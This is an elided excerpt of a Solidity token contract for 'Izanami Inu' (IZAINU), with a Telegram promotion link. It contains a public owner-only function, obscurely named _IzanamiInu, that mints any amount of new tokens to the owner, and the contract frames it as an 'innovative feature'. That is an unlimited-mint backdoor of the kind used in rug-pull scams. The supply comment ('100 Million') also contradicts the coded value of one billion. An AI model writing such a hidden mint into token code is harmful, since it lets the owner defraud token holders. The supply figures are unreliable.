...
//
// $IzanamiInu proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/izanamiInu
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _IzanamiInu(uint256 amount) public onlyOwner {
 _IzanamiInu(msg.sender, amount);
    }
    ...
    function _IzanamiInu(address account, uint256 amount) internal virtual {
...
contract $IzanamiInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Izanami Inu", "IZAINU") {
     _IzanamiInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}